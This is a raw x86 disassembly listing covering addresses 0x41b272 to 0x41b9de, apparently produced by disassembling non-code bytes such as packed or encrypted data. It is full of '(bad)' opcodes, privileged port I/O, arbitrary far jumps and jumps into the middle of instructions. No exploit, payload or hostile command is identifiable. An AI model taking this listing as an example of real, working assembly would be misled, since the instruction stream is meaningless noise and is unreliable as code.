  41b272:	lahf   
  41b273:	xchg   DWORD PTR [edx-0x42],esp
  41b276:	cmp    BYTE PTR [ebx],0xb8
  41b279:	retf   0xe773
  41b27c:	mov    bh,0x74
  41b27e:	inc    edi
  41b27f:	shr    DWORD PTR [ecx+0x15c16f30],0xe2
  41b286:	adc    edi,edx
  41b288:	sbb    al,0x7a
  41b28a:	mov    al,0xaa
  41b28c:	test   al,0x40
  41b28e:	loopne 0x41b30b
  41b290:	mov    ebp,0x3b6cd4ff
  41b295:	lea    esp,[ebx+0x1e322301]
  41b29b:	jae    0x41b246
  41b29d:	(bad)  
  41b29e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b29f:	pusha  
  41b2a0:	jg     0x41b2ca
  41b2a2:	inc    esp
  41b2a3:	mov    BYTE PTR [eax-0x1b715ba2],bl
  41b2a9:	pop    esi
  41b2aa:	out    0x30,eax
  41b2ac:	and    DWORD PTR [edi+0x27c48b9f],eax
  41b2b2:	push   cs
  41b2b3:	jecxz  0x41b28b
  41b2b5:	test   DWORD PTR [ebx+edx*8-0x1c],esp
  41b2b9:	call   0xb3c9ef90
  41b2be:	scas   al,BYTE PTR es:[edi]
  41b2bf:	adc    ch,BYTE PTR [ebp+eiz*2-0x4f6553dc]
  41b2c6:	(bad)  
  41b2c7:	pushf  
  41b2c8:	mov    ebp,0x36c6a70e
  41b2cd:	dec    eax
  41b2ce:	mov    BYTE PTR [ebp-0x462773fa],al
  41b2d4:	out    0x1e,eax
  41b2d6:	leave  
  41b2d7:	add    ebp,DWORD PTR [edi]
  41b2d9:	test   DWORD PTR [edx],0x41447ee2
  41b2df:	sub    DWORD PTR [eax+ecx*4],ecx
  41b2e2:	mov    esi,0xc6f3b2f4
  41b2e7:	mov    ds:0x125ca1ac,al
  41b2ec:	popa   
  41b2ed:	mov    bh,0xde
  41b2ef:	cld    
  41b2f0:	out    dx,al
  41b2f1:	std    
  41b2f2:	in     eax,0xab
  41b2f4:	pop    ds
  41b2f5:	dec    edi
  41b2f6:	push   es
  41b2f7:	fsubr  DWORD PTR [ecx-0x6b812f9b]
  41b2fd:	xor    bh,BYTE PTR [esi+0x26]
  41b300:	mov    ecx,0x5ad7adc0
  41b305:	lods   eax,DWORD PTR ds:[esi]
  41b306:	jbe    0x41b2af
  41b308:	ffree  st(4)
  41b30a:	ret    0x631b
  41b30d:	loopne 0x41b304
  41b30f:	das    
  41b310:	test   al,0x5d
  41b312:	rcl    DWORD PTR [edx+0x7b4fda3],0x25
  41b319:	sbb    al,0x6a
  41b31b:	push   cs
  41b31c:	data16 js 0x41b347
  41b31f:	aaa    
  41b320:	loop   0x41b2d6
  41b322:	add    BYTE PTR [esi+ebx*8+0xee490a],dh
  41b329:	and    BYTE PTR [edx],bl
  41b32b:	xlat   BYTE PTR ds:[ebx]
  41b32c:	pop    ecx
  41b32d:	sbb    BYTE PTR [ecx-0x64a82e41],dl
  41b333:	stos   DWORD PTR es:[edi],eax
  41b334:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b335:	je     0x41b2fc
  41b337:	ss jo  0x41b2e3
  41b33a:	arpl   WORD PTR [ebx],sp
  41b33c:	in     eax,dx
  41b33d:	out    dx,eax
  41b33e:	mov    esp,0x4e779c3a
  41b343:	lods   al,BYTE PTR ds:[esi]
  41b344:	mov    bl,0x95
  41b346:	aad    0x3d
  41b348:	popf   
  41b349:	cmp    bl,dh
  41b34b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b34c:	pop    edi
  41b34d:	out    dx,eax
  41b34e:	pop    ds
  41b34f:	mov    ds:0x760e23b,al
  41b354:	leave  
  41b355:	lea    esi,[eax]
  41b357:	add    eax,0x82eb669e
  41b35c:	jno    0x41b2e8
  41b35e:	jmp    0x41b3c8
  41b360:	test   eax,0x6187c9c0
  41b365:	add    edx,DWORD PTR [esi+eax*2]
  41b368:	xchg   edi,eax
  41b369:	sbb    ecx,DWORD PTR [eax-0x410e5a9f]
  41b36f:	push   ebp
  41b370:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b371:	std    
  41b372:	test   al,0x56
  41b374:	mov    ds:0x245e2f75,al
  41b37a:	mov    dh,0x30
  41b37c:	test   eax,0xb3996b26
  41b381:	fild   WORD PTR [ecx+0x58]
  41b384:	add    al,BYTE PTR [di-0x7d0b]
  41b389:	leave  
  41b38a:	dec    edx
  41b38b:	xor    eax,DWORD PTR [eax]
  41b38d:	sub    eax,0x7208b138
  41b392:	paddsw mm6,QWORD PTR [ecx+0x2a]
  41b396:	(bad)
  41b399:	gs ret 
  41b39b:	and    DWORD PTR [edx],0xc1d32469
  41b3a1:	sbb    eax,0x11d8f51a
  41b3a6:	mov    eax,ds:0x564805fd
  41b3ab:	mov    ebx,0xd9cca0be
  41b3b0:	xchg   ecx,eax
  41b3b1:	push   ebp
  41b3b2:	adc    BYTE PTR [edx+esi*4],ch
  41b3b5:	adc    BYTE PTR [esi+0x2eaa6dc6],dl
  41b3bb:	(bad)  
  41b3bc:	repz push esp
  41b3be:	mov    al,0xad
  41b3c0:	popa   
  41b3c1:	xchg   BYTE PTR [esi],al
  41b3c3:	add    esi,DWORD PTR [ebx]
  41b3c5:	push   0x226884e3
  41b3ca:	adc    dh,BYTE PTR [ebp-0x42c6f1e9]
  41b3d0:	and    edx,esp
  41b3d2:	fstp   TBYTE PTR [ebx+edi*1-0x26]
  41b3d6:	push   es
  41b3d7:	mov    dh,0x8a
  41b3d9:	jg     0x41b361
  41b3db:	cli    
  41b3dc:	daa    
  41b3dd:	arpl   WORD PTR [ebx],bp
  41b3df:	cli    
  41b3e0:	rcr    DWORD PTR [edi+0x1a],0x8a
  41b3e4:	outs   dx,DWORD PTR ds:[esi]
  41b3e5:	jg     0x41b42c
  41b3e7:	push   esi
  41b3e8:	mov    ds:0xccfa8c9d,al
  41b3ed:	push   cs
  41b3ee:	je     0x41b455
  41b3f0:	inc    ecx
  41b3f1:	dec    ebp
  41b3f2:	adc    dh,bl
  41b3f4:	mov    ebp,DWORD PTR [eax+esi*2]
  41b3f7:	pushf  
  41b3f8:	sub    edx,DWORD PTR [eax+ecx*8+0x197d28de]
  41b3ff:	jl     0x41b3c5
  41b401:	cmp    eax,0x7387bd59
  41b406:	sbb    al,0x59
  41b408:	nop
  41b409:	sbb    esp,DWORD PTR [edi]
  41b40b:	push   0x1c
  41b40d:	ror    BYTE PTR [edx],cl
  41b40f:	or     eax,0xbb54eaba
  41b414:	icebp  
  41b415:	mov    ecx,edx
  41b417:	push   ecx
  41b418:	adc    eax,0xc0d67086
  41b41d:	pop    ds
  41b41e:	cmc    
  41b41f:	in     eax,dx
  41b420:	xor    al,0x10
  41b422:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b423:	xchg   ecx,eax
  41b424:	cmp    al,0x95
  41b426:	pop    ds
  41b427:	sti    
  41b428:	jne    0x41b3c4
  41b42a:	gs popa 
  41b42c:	jmp    0x41b3e8
  41b42e:	xlat   BYTE PTR ds:[ebx]
  41b42f:	arpl   sp,dx
  41b431:	mov    ds:0xcb4b4181,al
  41b436:	pusha  
  41b437:	lock or al,0x9e
  41b43a:	scas   al,BYTE PTR es:[edi]
  41b43b:	lds    edi,FWORD PTR [esi]
  41b43d:	outs   dx,DWORD PTR ds:[esi]
  41b43e:	xchg   esp,edi
  41b440:	mov    bl,BYTE PTR [ebx]
  41b442:	inc    esi
  41b443:	js     0x41b3e4
  41b445:	xchg   ebp,eax
  41b446:	outs   dx,DWORD PTR ds:[esi]
  41b447:	mov    BYTE PTR [esi-0x75],bh
  41b44a:	ins    BYTE PTR es:[edi],dx
  41b44b:	int    0xcd
  41b44d:	dec    esp
  41b44e:	ficomp WORD PTR [esp+edx*8]
  41b451:	adc    esi,DWORD PTR [edx-0x2d]
  41b454:	(bad)  
  41b455:	mov    ebx,0x89c16dc
  41b45a:	in     eax,0xe4
  41b45c:	adc    eax,0x6a2ed71c
  41b461:	pop    ebp
  41b462:	cdq    
  41b463:	imul   edx,DWORD PTR [eax],0x7d
  41b466:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b467:	mov    WORD PTR ds:0x1a6ac0d9,?
  41b46d:	test   eax,0xe64aaf22
  41b472:	cli    
  41b473:	lods   al,BYTE PTR ds:[esi]
  41b474:	pop    ebx
  41b475:	das    
  41b476:	les    esp,FWORD PTR [ecx-0x53]
  41b479:	dec    ebx
  41b47a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b47b:	outs   dx,DWORD PTR ds:[esi]
  41b47c:	add    eax,0x7a2dae6
  41b481:	cli    
  41b482:	fimul  DWORD PTR [ebp-0x785d8d3f]
  41b488:	mov    ch,ah
  41b48a:	jecxz  0x41b493
  41b48c:	adc    dl,bh
  41b48e:	cmp    eax,0x6a6a0035
  41b493:	mov    edx,0x86781cde
  41b498:	xchg   esi,eax
  41b499:	mov    DWORD PTR [esi],edx
  41b49b:	in     al,0x3e
  41b49d:	leave  
  41b49e:	lods   al,BYTE PTR ds:[esi]
  41b49f:	fs xchg ebx,eax
  41b4a1:	sbb    dl,BYTE PTR [eax-0x79]
  41b4a4:	xchg   BYTE PTR [ebp+0x5d980f41],dl
  41b4aa:	fnstsw WORD PTR [esi-0x23]
  41b4ad:	js     0x41b48e
  41b4af:	sub    dl,BYTE PTR [ebx]
  41b4b1:	pop    edi
  41b4b2:	fidivr WORD PTR [edi-0x40a68a4f]
  41b4b8:	inc    esi
  41b4b9:	cmp    al,0x38
  41b4bb:	push   edx
  41b4bc:	fild   DWORD PTR [esi+0x7af5d46f]
  41b4c2:	loopne 0x41b485
  41b4c4:	pop    edi
  41b4c5:	push   ecx
  41b4c6:	test   dl,dl
  41b4c8:	rol    BYTE PTR [esi],cl
  41b4ca:	mov    dh,0x8f
  41b4cc:	repz cli 
  41b4ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4cf:	icebp  
  41b4d0:	ret    0xdcf1
  41b4d3:	xchg   ebx,eax
  41b4d4:	fimul  DWORD PTR [ecx+0x28]
  41b4d7:	dec    esp
  41b4d8:	inc    ecx
  41b4d9:	pusha  
  41b4da:	repz mov edi,0x36fca833
  41b4e0:	ret    0x86ae
  41b4e3:	sub    cl,BYTE PTR [edx+0x341717d0]
  41b4e9:	inc    edi
  41b4ea:	inc    ebx
  41b4eb:	enter  0x3e88,0xf9
  41b4ef:	cwde   
  41b4f0:	stos   DWORD PTR es:[edi],eax
  41b4f1:	cwde   
  41b4f2:	(bad)  
  41b4f3:	sbb    ch,ah
  41b4f5:	xchg   ah,bl
  41b4f7:	dec    edx
  41b4f8:	out    dx,al
  41b4f9:	fmul   DWORD PTR [edi+0x23]
  41b4fc:	jecxz  0x41b4c9
  41b4fe:	sbb    BYTE PTR gs:[ebp+0x27],dl
  41b502:	into   
  41b503:	jae    0x41b4a8
  41b505:	jno    0x41b543
  41b507:	dec    esi
  41b508:	sub    esi,DWORD PTR [ebx-0x32]
  41b50b:	fldcw  WORD PTR [edi-0x3b82d59c]
  41b511:	pop    ecx
  41b512:	adc    eax,0x9070e3f1
  41b517:	add    DWORD PTR [ebx],esi
  41b519:	jmp    0x41b49e
  41b51b:	ins    BYTE PTR es:[edi],dx
  41b51c:	ins    DWORD PTR es:[edi],dx
  41b51d:	xor    DWORD PTR [esi],eax
  41b51f:	popa   
  41b520:	into   
  41b521:	imul   esp,ecx,0xffffff93
  41b524:	or     al,0xb0
  41b526:	mov    ebp,0x84742890
  41b52b:	bound  ebx,QWORD PTR [ebp-0x9]
  41b52e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b52f:	loopne 0x41b4c6
  41b531:	mov    bh,0x7d
  41b533:	add    eax,DWORD PTR [esi+edx*8]
  41b536:	retf   0xf497
  41b539:	jno    0x41b598
  41b53b:	test   BYTE PTR [ebx+0x3bb7f805],cl
  41b541:	mov    ah,0xcc
  41b543:	pop    edi
  41b544:	imul   esp,DWORD PTR [esi+0x17],0xffffffec
  41b548:	mov    dh,0x1a
  41b54a:	std    
  41b54b:	ja     0x41b5c2
  41b54d:	mov    ds:0xa970ce65,al
  41b552:	out    0x40,eax
  41b554:	jl     0x41b4d6
  41b556:	enter  0xb159,0xa5
  41b55a:	aad    0xfc
  41b55c:	mov    dh,0xbf
  41b55e:	and    BYTE PTR [ebx+0xf],ah
  41b561:	outs   dx,BYTE PTR ds:[esi]
  41b562:	cmc    
  41b563:	clc    
  41b564:	pushf  
  41b565:	inc    edx
  41b566:	adc    cl,BYTE PTR [edi+0x3a]
  41b569:	ds push esp
  41b56b:	xor    cl,BYTE PTR [ebp-0x74]
  41b56e:	jne    0x41b5e2
  41b570:	mov    esp,0xc26ae517
  41b575:	(bad)  
  41b576:	hlt    
  41b577:	rdpmc  
  41b579:	test   eax,0x816d9a82
  41b57e:	pop    es
  41b57f:	inc    edx
  41b580:	xchg   edi,eax
  41b581:	jl     0x41b5b1
  41b583:	fs xchg ecx,eax
  41b585:	mov    eax,DWORD PTR [edi-0x778e826a]
  41b58b:	test   eax,0x5cd59b1b
  41b590:	shr    BYTE PTR [ecx+0x63183465],0xb9
  41b597:	xchg   esp,eax
  41b598:	out    dx,al
  41b599:	imul   edi,DWORD PTR [edi],0xffffffbf
  41b59c:	xor    DWORD PTR ds:0xefc0b46c,ebp
  41b5a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5a3:	sbb    edx,DWORD PTR [ecx+ebx*8-0x2bbad86f]
  41b5aa:	je     0x41b60a
  41b5ac:	push   ds
  41b5ad:	cmp    eax,0x94c16ba6
  41b5b2:	xchg   BYTE PTR [ebx-0x4f],dh
  41b5b5:	mov    ah,0x21
  41b5b7:	ja     0x41b577
  41b5b9:	push   0xffffffa8
  41b5bb:	enter  0xe4bb,0x37
  41b5bf:	adc    ah,BYTE PTR ds:0x7bed6ef3
  41b5c5:	pushf  
  41b5c6:	pop    esp
  41b5c8:	pop    ebx
  41b5c9:	aaa    
  41b5ca:	pop    ebx
  41b5cb:	shl    BYTE PTR [esi-0x579cfa52],cl
  41b5d1:	and    BYTE PTR [ecx],0x61
  41b5d4:	movzx  ebx,WORD PTR [edx+ebp*2+0x7c63c009]
  41b5dc:	std    
  41b5dd:	aam    0x8e
  41b5df:	loope  0x41b604
  41b5e1:	int    0x25
  41b5e3:	into   
  41b5e4:	ss fsubrp st(1),st
  41b5e7:	push   edi
  41b5e8:	inc    esi
  41b5e9:	cs ret 
  41b5eb:	cmp    eax,0x2ea73249
  41b5f0:	nop
  41b5f1:	inc    esp
  41b5f2:	inc    ecx
  41b5f3:	stc    
  41b5f4:	lea    ebp,[ebp-0x443b7080]
  41b5fa:	sbb    ebx,DWORD PTR [eax-0xbcaad94]
  41b600:	mov    bh,0x4f
  41b602:	leave  
  41b603:	(bad)  
  41b604:	(bad)  
  41b605:	hlt    
  41b606:	or     eax,0x8b6ffc34
  41b60b:	xlat   BYTE PTR ds:[ebx]
  41b60c:	xchg   ecx,eax
  41b60d:	retf   0xd2cf
  41b610:	test   eax,0x6349899f
  41b615:	or     DWORD PTR [ebp+eax*8-0x1d11f871],eax
  41b61c:	in     eax,dx
  41b61d:	dec    edx
  41b61e:	leave  
  41b61f:	inc    edx
  41b620:	icebp  
  41b621:	(bad)  
  41b622:	pushf  
  41b623:	punpcklwd mm0,DWORD PTR [edx+0x313114e8]
  41b62a:	outs   dx,BYTE PTR ds:[esi]
  41b62b:	int    0xcd
  41b62d:	jno    0x41b5f1
  41b62f:	lahf   
  41b630:	jne    0x41b5e6
  41b632:	mov    ebp,0x8c95a5dd
  41b637:	test   DWORD PTR [esi+0x1c],edi
  41b63a:	hlt    
  41b63b:	and    al,0x95
  41b63d:	and    al,0x1a
  41b63f:	pushf  
  41b640:	fwait
  41b641:	push   0xffffffd4
  41b643:	xor    eax,0x40b54d41
  41b648:	repnz test al,0xc0
  41b64b:	call   0xa90987
  41b650:	inc    edx
  41b651:	(bad)  
  41b652:	ss cmp al,0x25
  41b655:	or     ebx,edx
  41b657:	xchg   ebx,eax
  41b658:	jmp    0x41b644
  41b65a:	add    ch,BYTE PTR [ebx-0x56]
  41b65d:	enter  0x22fa,0xea
  41b661:	leave  
  41b662:	rol    DWORD PTR [ebx+edx*4+0x1a],cl
  41b666:	aas    
  41b667:	lods   eax,DWORD PTR ds:[esi]
  41b668:	call   0xe53c:0xccd8efe1
  41b66f:	xor    BYTE PTR [esi+0x237232fc],bl
  41b675:	xor    al,0x78
  41b677:	jbe    0x41b657
  41b679:	push   esp
  41b67a:	(bad)  
  41b67b:	fdivr  DWORD PTR [edx+eiz*1]
  41b67e:	aad    0xc3
  41b680:	in     eax,0x48
  41b682:	shl    BYTE PTR [eax+eax*2],0xa
  41b686:	pop    esi
  41b687:	test   al,0x61
  41b689:	mov    esp,0x63480465
  41b68e:	adc    al,BYTE PTR [edx-0x69]
  41b691:	xor    al,0x3f
  41b693:	push   edx
  41b694:	xor    DWORD PTR [eax],0xa0a39ede
  41b69a:	(bad)  
  41b69b:	and    sp,WORD PTR [edi+0x28]
  41b69f:	jo     0x41b64d
  41b6a1:	xchg   ebp,eax
  41b6a2:	cmp    ebx,DWORD PTR [edi+0x18f22a60]
  41b6a8:	loopne 0x41b716
  41b6aa:	ficom  WORD PTR [esi]
  41b6ac:	jecxz  0x41b707
  41b6ae:	mov    cl,ah
  41b6b0:	push   esp
  41b6b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6b2:	dec    ecx
  41b6b3:	dec    esi
  41b6b4:	and    eax,0x737e91c8
  41b6b9:	push   0xfffffff1
  41b6bb:	mov    al,ds:0x557a9f4b
  41b6c0:	push   ds
  41b6c1:	fldcw  WORD PTR ds:0xc67db1bf
  41b6c7:	ss jmp 0xaacb36b6
  41b6cd:	aad    0x8d
  41b6cf:	inc    edx
  41b6d0:	fwait
  41b6d1:	push   edi
  41b6d2:	xchg   ebp,eax
  41b6d3:	data16 cmp cl,dl
  41b6d6:	mov    BYTE PTR [ebx],0xd4
  41b6d9:	adc    eax,0xfefeaa8f
  41b6de:	cli    
  41b6df:	arpl   WORD PTR [esi+0x5ecc02fa],bp
  41b6e5:	stc    
  41b6e6:	nop
  41b6e7:	push   cs
  41b6e8:	aad    0x86
  41b6ea:	test   DWORD PTR [eax+0x6d],ebx
  41b6ed:	push   esp
  41b6ee:	jmp    0x7c51:0x675de7bd
  41b6f5:	push   ecx
  41b6f6:	out    dx,eax
  41b6f7:	push   cs
  41b6f8:	mov    eax,edi
  41b6fa:	popf   
  41b6fb:	jle    0x41b67f
  41b6fd:	mov    dl,0xa2
  41b6ff:	push   edx
  41b700:	mov    eax,0x16010425
  41b705:	jp     0x41b6ed
  41b707:	sti    
  41b708:	or     BYTE PTR [ebx-0x2146e9e8],0x35
  41b70f:	(bad)  
  41b710:	fwait
  41b711:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b712:	mov    edi,0xe51df149
  41b717:	gs push ebp
  41b719:	mov    cl,0x1
  41b71b:	pop    esp
  41b71c:	scas   al,BYTE PTR es:[edi]
  41b71d:	adc    bh,ah
  41b71f:	aaa    
  41b720:	daa    
  41b721:	dec    esi
  41b722:	sbb    eax,0x74685fb4
  41b727:	jmp    FWORD PTR [esi-0x5fb32b01]
  41b72d:	ret    0xaf79
  41b730:	xor    eax,0x22ad0d5b
  41b735:	inc    ecx
  41b736:	outs   dx,BYTE PTR ds:[esi]
  41b737:	cli    
  41b738:	lea    edx,[eax+ecx*8+0x2278ba60]
  41b73f:	loope  0x41b7a3
  41b741:	in     eax,dx
  41b742:	mov    bl,0xf7
  41b744:	clc    
  41b745:	mov    eax,DWORD PTR [eax+0x11c9f3f6]
  41b74b:	mov    ebp,0x4540bff
  41b750:	lods   eax,DWORD PTR ds:[esi]
  41b751:	shl    dl,1
  41b753:	add    al,0xe8
  41b755:	cli    
  41b756:	adc    BYTE PTR [esi+0x276475c9],al
  41b75c:	fsub   DWORD PTR [edx-0x11d5ab61]
  41b762:	add    bh,BYTE PTR [ebx+0x560b0607]
  41b768:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b769:	sbb    eax,0x5db5714e
  41b76e:	adc    BYTE PTR [edi+0x1b603175],dl
  41b774:	jecxz  0x41b7bd
  41b776:	into   
  41b777:	push   cs
  41b778:	cli    
  41b779:	jbe    0x41b7de
  41b77b:	fistp  QWORD PTR [edi]
  41b77d:	outs   dx,DWORD PTR ds:[esi]
  41b77e:	out    dx,al
  41b77f:	or     DWORD PTR [ecx+0x39b142f5],0x3f5e9abd
  41b789:	ret    
  41b78a:	out    0xcb,al
  41b78c:	inc    ecx
  41b78d:	in     al,dx
  41b78e:	mov    dl,0x4e
  41b790:	test   DWORD PTR [ebp+0x7fe6d086],0x8505418
  41b79a:	mov    al,0x15
  41b79c:	stos   BYTE PTR es:[edi],al
  41b79d:	cld    
  41b79e:	test   bl,bh
  41b7a0:	aas    
  41b7a1:	mov    edi,0x3add5afb
  41b7a6:	and    bh,cl
  41b7a8:	cmp    ah,BYTE PTR [eax+eax*1-0x27]
  41b7ac:	stc    
  41b7ad:	out    0xb3,eax
  41b7af:	push   ecx
  41b7b0:	repnz imul DWORD PTR [edx+esi*8-0x4a]
  41b7b5:	sbb    eax,0x1c95bef1
  41b7ba:	add    DWORD PTR [edx+0x75],edx
  41b7bd:	sti    
  41b7be:	push   ds
  41b7bf:	stos   DWORD PTR es:[edi],eax
  41b7c0:	sahf   
  41b7c1:	add    eax,0xb8d07b5f
  41b7c6:	test   eax,0x73d1b3ab
  41b7cb:	stos   DWORD PTR es:[edi],eax
  41b7cc:	mov    dh,0x12
  41b7ce:	in     eax,dx
  41b7cf:	adc    dh,BYTE PTR [ebx+0x76756322]
  41b7d5:	imul   eax,edx,0x72
  41b7d8:	repz je 0x41b84e
  41b7db:	mov    bl,0xad
  41b7dd:	jmp    0x255e:0x269b9c65
  41b7e4:	mov    edx,edx
  41b7e6:	dec    ebx
  41b7e7:	mov    ecx,0x3479ea74
  41b7ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7ed:	pusha  
  41b7ee:	mov    esp,0xefe3e9dd
  41b7f3:	adc    cl,BYTE PTR [edx]
  41b7f5:	je     0x41b7af
  41b7f7:	fidiv  WORD PTR [ecx]
  41b7f9:	xchg   esi,eax
  41b7fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7fb:	sahf   
  41b7fc:	inc    ecx
  41b7fd:	das    
  41b7fe:	xchg   edi,eax
  41b7ff:	mov    al,0x57
  41b801:	adc    eax,esi
  41b803:	lea    edx,[esi+0x4a0905ab]
  41b809:	mov    dh,0x9b
  41b80b:	leave  
  41b80c:	fisubr WORD PTR [ecx+0x16794756]
  41b812:	jns    0x41b7e7
  41b814:	jb     0x41b80d
  41b816:	fs push ecx
  41b818:	dec    ebp
  41b819:	ins    BYTE PTR es:[edi],dx
  41b81a:	xor    DWORD PTR [eax+0x16],ecx
  41b81d:	cmp    ah,BYTE PTR [edx-0x177090b8]
  41b823:	clc    
  41b824:	xor    eax,DWORD PTR [ebp-0x6dd421b8]
  41b82a:	jmp    0x17a:0xfdc777a
  41b831:	cld    
  41b832:	xor    DWORD PTR [edi+0x3f0a6bf5],esi
  41b838:	out    dx,eax
  41b839:	test   al,0x8
  41b83b:	inc    esp
  41b83c:	ret    0x9f61
  41b83f:	sbb    ebx,0xffffffc2
  41b842:	mov    ds:0xd9d3d821,al
  41b847:	mov    BYTE PTR [ecx+0x5c],ch
  41b84a:	fcmovne st,st(3)
  41b84c:	push   ebx
  41b84d:	loope  0x41b83f
  41b84f:	sbb    BYTE PTR [ebp-0x35d101f1],dh
  41b855:	add    cl,BYTE PTR [ecx]
  41b857:	xor    BYTE PTR [ebx],bh
  41b859:	loopne 0x41b886
  41b85b:	mov    esp,0xe2c0d84a
  41b860:	xchg   DWORD PTR [ecx],esp
  41b862:	inc    ebp
  41b863:	test   eax,0x77c34544
  41b868:	stc    
  41b869:	shl    BYTE PTR [ebx-0x747cf972],0x2
  41b870:	push   ebp
  41b871:	rcr    DWORD PTR [ebx+edi*8-0x51],cl
  41b875:	je     0x41b854
  41b877:	outs   dx,DWORD PTR ds:[esi]
  41b878:	adc    al,0xa2
  41b87a:	dec    esp
  41b87b:	adc    ebp,DWORD PTR [ebp-0x14ce0f17]
  41b881:	sub    DWORD PTR [edx+0x7bee9042],ecx
  41b887:	(bad)  
  41b888:	popa   
  41b889:	sbb    edx,DWORD PTR [esp+edx*4]
  41b88c:	mov    ds:0xe865df2f,eax
  41b891:	xchg   edi,eax
  41b892:	setge  dl
  41b895:	jmp    0x41b86c
  41b897:	add    ebx,DWORD PTR [ebx]
  41b899:	and    esp,edx
  41b89b:	adc    DWORD PTR [ebp+ebp*1+0x4215e2eb],ebx
  41b8a2:	xchg   esp,eax
  41b8a3:	mov    ebx,0x69bd7c96
  41b8a8:	push   0x9
  41b8aa:	push   ebx
  41b8ab:	mov    ch,0xa7
  41b8ad:	and    eax,0x696eded8
  41b8b2:	stos   DWORD PTR es:[edi],eax
  41b8b3:	repnz mov edi,0xdffb0449
  41b8b9:	fwait
  41b8ba:	repnz push 0x4152b0eb
  41b8c0:	ret    
  41b8c1:	outs   dx,BYTE PTR ds:[esi]
  41b8c2:	out    dx,eax
  41b8c3:	dec    ebx
  41b8c4:	retf   0xf6ef
  41b8c7:	mov    al,ds:0x2e45238f
  41b8cc:	outs   dx,BYTE PTR ds:[esi]
  41b8cd:	mov    DWORD PTR [edx],esi
  41b8cf:	jmp    0xaa50a15f
  41b8d4:	int    0x73
  41b8d6:	inc    edx
  41b8d7:	xchg   BYTE PTR [edi+0x74c1531d],bl
  41b8dd:	fs push ebx
  41b8df:	jle    0x41b906
  41b8e1:	xchg   edx,eax
  41b8e2:	loopne 0x41b8df
  41b8e4:	mov    dl,0xa5
  41b8e6:	scas   eax,DWORD PTR es:[edi]
  41b8e7:	add    dl,BYTE PTR [eax+0x11a529b6]
  41b8ed:	das    
  41b8ee:	mov    ecx,ebx
  41b8f0:	test   dh,dl
  41b8f2:	jb     0x41b876
  41b8f4:	inc    ecx
  41b8f5:	push   cs
  41b8f6:	nop
  41b8f7:	arpl   sp,di
  41b8f9:	pop    ss
  41b8fa:	(bad)  
  41b8fb:	adc    ebp,ebp
  41b8fd:	test   eax,0xa7c89272
  41b902:	retf   0x7bcf
  41b905:	sbb    al,0x5b
  41b907:	sbb    eax,0x3eb8c9db
  41b90c:	out    0x4f,eax
  41b90e:	aas    
  41b90f:	xor    cl,BYTE PTR [esi+0x2c]
  41b912:	out    0x3,al
  41b914:	rcl    DWORD PTR [eax-0x4a2dedd1],cl
  41b91a:	sbb    esp,DWORD PTR [edi-0x505545fd]
  41b920:	pop    ss
  41b921:	cmp    eax,0x68947588
  41b926:	aam    0xfd
  41b928:	inc    edx
  41b929:	xor    eax,0x1d9300ae
  41b92e:	ds and esi,0xfffffff9
  41b932:	lds    ecx,FWORD PTR [ebp+0x5fa71a62]
  41b938:	pop    ebp
  41b939:	push   eax
  41b93a:	imul   esi,DWORD PTR [edx-0x59b706c3],0xfffffff4
  41b941:	jae    0x41b958
  41b943:	(bad)  
  41b945:	scas   al,BYTE PTR es:[edi]
  41b946:	popf   
  41b947:	jmp    0x499d:0x6a3abb19
  41b94e:	ss stos DWORD PTR es:[edi],eax
  41b950:	pop    ss
  41b951:	fs in  al,0xa7
  41b954:	div    dh
  41b956:	les    ebx,FWORD PTR [edx+0x4]
  41b959:	mov    ebx,DWORD PTR [ecx-0x74]
  41b95c:	aad    0xca
  41b95e:	dec    esp
  41b95f:	cmp    BYTE PTR [edi-0x65],dh
  41b962:	sti    
  41b963:	jmp    0x7c92bf61
  41b968:	cmp    BYTE PTR [ecx+0x617ed912],dh
  41b96e:	jg     0x41b95d
  41b970:	or     al,0x4e
  41b972:	inc    edi
  41b973:	js     0x41b99f
  41b975:	ds (bad) 
  41b977:	ins    DWORD PTR es:[edi],dx
  41b978:	pop    edx
  41b979:	jns    0x41b8ff
  41b97b:	mov    ch,0xe3
  41b97d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b97e:	loope  0x41b98e
  41b980:	scas   eax,DWORD PTR es:[edi]
  41b981:	cli    
  41b982:	push   ds
  41b983:	cwde   
  41b984:	(bad)  
  41b985:	mov    edx,0xe7a03199
  41b98a:	or     ebx,DWORD PTR [ebx-0x12]
  41b98d:	push   esp
  41b98e:	into   
  41b98f:	dec    ebp
  41b990:	mov    edx,0xd5605ad3
  41b995:	mov    esi,0x7155349
  41b99a:	or     ebp,DWORD PTR [ebx]
  41b99c:	or     ebx,DWORD PTR ds:0x86ce5658
  41b9a2:	lock jmp 0xe3c5:0x52f5d97a
  41b9aa:	jne    0x41b9fd
  41b9ac:	jmp    0xe0fb5de0
  41b9b1:	call   DWORD PTR [esi-0x29e5558d]
  41b9b7:	hlt    
  41b9b8:	mov    WORD PTR [edi],gs
  41b9ba:	xchg   DWORD PTR [ecx],ecx
  41b9bc:	cwde   
  41b9bd:	loopne 0x41b954
  41b9bf:	push   edx
  41b9c0:	mov    bh,0xb
  41b9c2:	jno    0x41b9d3
  41b9c4:	jo     0x41b96a
  41b9c6:	loopne 0x41ba21
  41b9c8:	mov    ds:0x55df0354,eax
  41b9cd:	aas    
  41b9ce:	test   BYTE PTR [ecx-0x74],0x6f
  41b9d2:	std    
  41b9d3:	mov    ah,0x7
  41b9d5:	jnp    0x41b9a3
  41b9d7:	inc    eax
  41b9d8:	pop    eax
  41b9d9:	or     al,0xdf
  41b9db:	add    edx,0xfffffffa
  41b9de:	fucom  st(6)
